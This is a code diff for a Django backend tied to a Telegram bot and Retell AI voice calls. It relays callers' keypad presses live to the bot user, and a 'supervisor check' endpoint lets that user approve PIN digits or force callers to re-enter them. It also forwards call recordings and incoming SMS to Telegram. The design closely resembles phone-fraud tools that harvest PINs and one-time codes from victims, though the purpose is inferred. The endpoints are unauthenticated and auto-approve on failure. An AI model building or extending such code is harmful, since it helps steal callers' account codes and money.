@@ -475,6 +475,263 @@ def _handle_call_analyzed(call_data):
 
 
 # =============================================================================
+# transcript_updated — real-time DTMF streaming to bot user
+# =============================================================================
+
+def _handle_transcript_updated(call_data):
+    """
+    Process real-time transcript updates to detect DTMF presses
+    and stream them to the bot user via Telegram instantly.
+    Only applicable for single IVR calls (not bulk campaigns).
+    """
+    call_id = call_data.get("call_id", "")
+    transcript_obj = call_data.get("transcript_with_tool_calls") or call_data.get("transcript_object", [])
+
+    if not transcript_obj:
+        return
+
+    # Get cursor position — only process new entries
+    cursor = _transcript_cursor.get(call_id, 0)
+    new_entries = transcript_obj[cursor:]
+    _transcript_cursor[call_id] = len(transcript_obj)
+
+    if not new_entries:
+        return
+
+    # Look up user — skip bulk campaign calls
+    call_log = CallLogsTable.objects.filter(call_id=call_id).first()
+    if not call_log:
+        return
+    user_id = call_log.user_id
+
+    # Skip bulk calls — supervisor check is single-call only
+    if BatchCallLogs.objects.filter(call_id=call_id).exists():
+        return
+
+    for entry in new_entries:
+        if entry.get("role") != "user":
+            continue
+        text = entry.get("content", "")
+
+        # Detect DTMF presses — Retell formats as "Pressed Button: X"
+        if "Pressed Button: " in text:
+            digit = text.split("Pressed Button: ")[1].strip()
+            try:
+                bot.send_message(
+                    user_id,
+                    f"🔢 *DTMF Input Detected*\nCaller pressed: `{digit}`\nCall: `{call_id[:12]}...`",
+                    parse_mode="Markdown",
+                )
+            except Exception as e:
+                logger.warning(f"[transcript_updated] Failed to notify user {user_id}: {e}")
+
+
+def _deliver_recording_to_user(call_data):
+    """Send call recording to bot user via Telegram after call ends."""
+    call_id = call_data.get("call_id", "")
+    recording_url = call_data.get("recording_url", "")
+    if not recording_url:
+        return
+
+    call_log = CallLogsTable.objects.filter(call_id=call_id).first()
+    if not call_log:
+        return
+
+    user_id = call_log.user_id
+    to_number = call_data.get("to_number", "")
+    from_number = call_data.get("from_number", "")
+    duration_ms = call_data.get("duration_ms", 0) or 0
+    duration_min = duration_ms / 60000.0
+    direction = call_data.get("direction", "outbound")
+
+    # Check if this is an inbound call to user's purchased number
+    is_inbound = False
+    if direction == "inbound" or UserPhoneNumber.objects.filter(
+        phone_number=to_number, user__user_id=user_id, is_active=True
+    ).exists():
+        is_inbound = True
+
+    try:
+        if is_inbound:
+            msg = (
+                f"📬 *Inbound Call Recording*\n"
+                f"From: `{from_number}`\n"
+                f"To: `{to_number}`\n"
+                f"Duration: {duration_min:.1f} min\n"
+                f"🎙 [Listen to recording]({recording_url})"
+            )
+        else:
+            msg = (
+                f"🎙 *Call Recording Available*\n"
+                f"To: `{to_number}`\n"
+                f"Duration: {duration_min:.1f} min\n"
+                f"🔗 [Listen to recording]({recording_url})"
+            )
+        bot.send_message(user_id, msg, parse_mode="Markdown", disable_web_page_preview=True)
+    except Exception as e:
+        logger.warning(f"[recording] Failed to send recording to user {user_id}: {e}")
+
+
+# =============================================================================
+# Supervisor DTMF Check — called by Retell custom function mid-call
+# =============================================================================
+
+@csrf_exempt
+def dtmf_supervisor_check(request):
+    """
+    Endpoint called by Retell custom function tool during single IVR calls.
+    Receives DTMF digits, notifies bot user, polls for approval/rejection.
+    Only for single calls, NOT bulk campaigns.
+
+    POST /api/dtmf/supervisor-check
+    Body: {"call_id": "...", "args": {"digits": "123456", "node_name": "Enter PIN"}}
+    """
+    if request.method != "POST":
+        return JsonResponse({"status": "method_not_allowed"}, status=405)
+
+    try:
+        payload = json.loads(request.body)
+        call_id = payload.get("call_id", "")
+        args = payload.get("args", {})
+        digits = args.get("digits", "")
+        node_name = args.get("node_name", "DTMF Input")
+
+        if not call_id or not digits:
+            return JsonResponse({"result": "proceed", "message": "Missing data, proceeding."})
+
+        # Look up user
+        call_log = CallLogsTable.objects.filter(call_id=call_id).first()
+        if not call_log:
+            return JsonResponse({"result": "proceed", "message": "Call not found, proceeding."})
+
+        user_id = call_log.user_id
+
+        # Skip bulk campaign calls — proceed without supervisor check
+        if BatchCallLogs.objects.filter(call_id=call_id).exists():
+            return JsonResponse({"result": "proceed", "message": "Bulk call, auto-approved."})
+
+        # Create pending approval
+        approval = PendingDTMFApproval.objects.create(
+            call_id=call_id,
+            user_id=user_id,
+            digits=digits,
+            node_name=node_name,
+            status="pending",
+        )
+
+        # Notify bot user
+        from telebot import types
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("✅ Approve", callback_data=f"dtmf_approve_{approval.id}"),
+            types.InlineKeyboardButton("❌ Re-enter", callback_data=f"dtmf_reject_{approval.id}"),
+        )
+        try:
+            bot.send_message(
+                user_id,
+                f"🔔 *Supervisor Check*\n\n"
+                f"Step: *{node_name}*\n"
+                f"Caller entered: `{digits}`\n"
+                f"Call: `{call_id[:16]}...`\n\n"
+                f"⏱ Respond within 20 seconds or it will auto-approve.",
+                reply_markup=markup,
+                parse_mode="Markdown",
+            )
+        except Exception as e:
+            logger.warning(f"[supervisor] Failed to notify user {user_id}: {e}")
+            return JsonResponse({"result": "proceed", "message": "Notification failed, auto-approved."})
+
+        # Poll for response — up to 20 seconds
+        import time
+        for _ in range(10):
+            time.sleep(2)
+            approval.refresh_from_db()
+            if approval.status == "approved":
+                return JsonResponse({"result": "proceed", "message": "Supervisor approved."})
+            elif approval.status == "rejected":
+                return JsonResponse({"result": "re_enter", "message": "Supervisor rejected. Ask caller to re-enter."})
+
+        # Timeout — auto-approve
+        approval.status = "timeout"
+        approval.resolved_at = timezone.now()
+        approval.save()
+        return JsonResponse({"result": "proceed", "message": "Timeout, auto-approved."})
+
+    except json.JSONDecodeError:
+        return JsonResponse({"result": "proceed", "message": "Invalid JSON."})
+    except Exception as e:
+        logger.error(f"[supervisor] Error: {e}")
+        return JsonResponse({"result": "proceed", "message": f"Error: {str(e)}"})
+
+
+# =============================================================================
+# Inbound SMS Webhook — delivers SMS to bot user's Telegram
+# =============================================================================
+
+@csrf_exempt
+def inbound_sms_webhook(request):
+    """
+    Receives inbound SMS forwarded from Retell's inbound webhook.
+    Stores in SMSInbox and delivers to bot user via Telegram.
+
+    POST /api/webhook/sms
+    Body: {"to_number": "+1...", "from_number": "+1...", "message": "Hello...", ...}
+    """
+    if request.method != "POST":
+        return JsonResponse({"status": "method_not_allowed"}, status=405)
+
+    try:
+        payload = json.loads(request.body)
+        to_number = payload.get("to_number", payload.get("to", ""))
+        from_number = payload.get("from_number", payload.get("from", ""))
+        message_text = payload.get("message", payload.get("text", payload.get("content", "")))
+
+        if not to_number or not from_number:
+            return JsonResponse({"status": "error", "message": "Missing number fields"}, status=400)
+
+        # Find the user who owns this number
+        phone_record = UserPhoneNumber.objects.filter(
+            phone_number=to_number, is_active=True
+        ).first()
+
+        if not phone_record:
+            logger.warning(f"[sms] Received SMS for unregistered number: {to_number}")
+            return JsonResponse({"status": "ok", "message": "Number not assigned to any user"})
+
+        user_id = phone_record.user.user_id
+
+        # Store in SMS Inbox
+        sms = SMSInbox.objects.create(
+            user=phone_record.user,
+            phone_number=to_number,
+            from_number=from_number,
+            message=message_text or "(empty message)",
+        )
+
+        # Deliver to bot user via Telegram
+        try:
+            bot.send_message(
+                user_id,
+                f"📩 *New SMS Received*\n\n"
+                f"From: `{from_number}`\n"
+                f"To: `{to_number}`\n"
+                f"Message:\n{message_text or '(empty)'}",
+                parse_mode="Markdown",
+            )
+        except Exception as e:
+            logger.warning(f"[sms] Failed to deliver SMS to user {user_id}: {e}")
+
+        logger.info(f"[sms] SMS from {from_number} to {to_number} delivered to user {user_id}")
+        return JsonResponse({"status": "ok"})
+
+    except json.JSONDecodeError:
+        return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)
+    except Exception as e:
+        logger.error(f"[sms] Error: {e}")
+        return JsonResponse({"status": "error", "message": str(e)}, status=500)
+
+
+# =============================================================================
 # Webhook endpoints
 # =============================================================================
 
